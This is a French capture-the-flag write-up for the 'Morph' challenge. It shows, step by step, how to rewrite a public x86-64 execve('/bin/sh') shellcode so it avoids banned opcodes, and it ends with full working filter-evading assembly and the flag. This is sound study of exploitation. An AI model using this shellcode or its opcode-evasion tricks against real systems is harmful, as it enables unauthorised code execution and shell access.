# Writeup - Morph

Le but est d'écrire un shellcode permettant d'accéder au flag (ou un shell sur la machine), tout en satisfaisant les conditions demandées (filtre de certains opcodes).

## Solve

On prend le premier shellcode dispo sur internet : https://shell-storm.org/shellcode/files/shellcode-909.html

```as
	mov rax, 0x68732f6e69622f
	push rax
	push rsp
	pop rdi
	xor eax, eax
	push rax
	mov al, 59
	push rsp
	pop rdx
	push rsp
	pop rsi
	syscall
``` 

On peut vérifier si notre shellcode contient les opcodes bannis sur : https://shell-storm.org/online/Online-Assembler-and-Disassembler/

Dans ce cas-là on tombe sur des opcodes bannis, on va donc aller modifier les instructions problématiques par d'autres instructions équivalentes dans notre contexte.

### Problème 1 : b
Le "b" est banni, impossible de noter `/bin/bash` ou `/bin/sh`, il faut donc ruser : on divise la valeur décimale de `/bin/sh` en deux valeurs qu'on additionne, et hop. On aurait aussi pu faire une soustraction, un xor, peu importe !

```as
; Instructions avec b
	mov rax, 0x68732f6e69622f
	push rax
; "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00"


; Instructions sans b
	mov rdx, 0x343997b734b117
	mov rcx, 0x343997b734b118
	add rdx, rcx
	push rdx
; "\x48\xba\x17\xb1\x34\xb7\x97\x39\x34\x00\x48\xb9\x18\xb1\x34\xb7\x97\x39\x34\x00\x48\x01\xca\x52"
```

### Problème 2 : pop rsi
L'opcode de `pop rsi` est `\x5e` et est banni, on va donc le contourner : on passe par le registre `rcx` en intermédiaire.

```as
; Instructions avec pop rsi
	pop rsi
	syscall
; "\x5e\x0f\x05"

; Instructions sans pop rsi
	pop rcx
	mov rsi, rcx
	syscall
; "\x59\x48\x89\xce\x0f\x05"
```

### Problème 3 : xor
Certains xor utilisent l'opcode `\x31`, on va donc utiliser `mov reg, 0` à la place. Ça prend plus de place, mais ça fonctionne !

```as
; Instructions avec xor
	xor eax, eax
	push rax
; "\x31\xc0\x50"

; Instructions sans xor
	mov rcx, 0
	push rcx
; "\x48\xc7\xc1\x00\x00\x00\x00\x51"
```

### Problème 4 : push rax
De même avec `\x50` qui représente `push rax`, on va donc utiliser un autre registre. (c'est déjà ce qu'on a fait pour les autres).

## Solution finale proposée

D'autres solutions (plus optimisées) existent, mais voici une solution qui fonctionne :
```as
		mov rdx, 0x343997b734b117
		mov rcx, 0x343997b734b118
		add rdx, rcx
		push rdx
		push rsp
		pop rdi
		mov rcx, 0
		push rcx
		mov al, 59
		push rsp
		pop rdx
		push rsp
		pop rcx
		mov rsi, rcx
		syscall
```

Il suffit d'afficher le flag :
`cat /flag.txt`

> `BZHCTF{PikaPika_erm...MetaMeta}`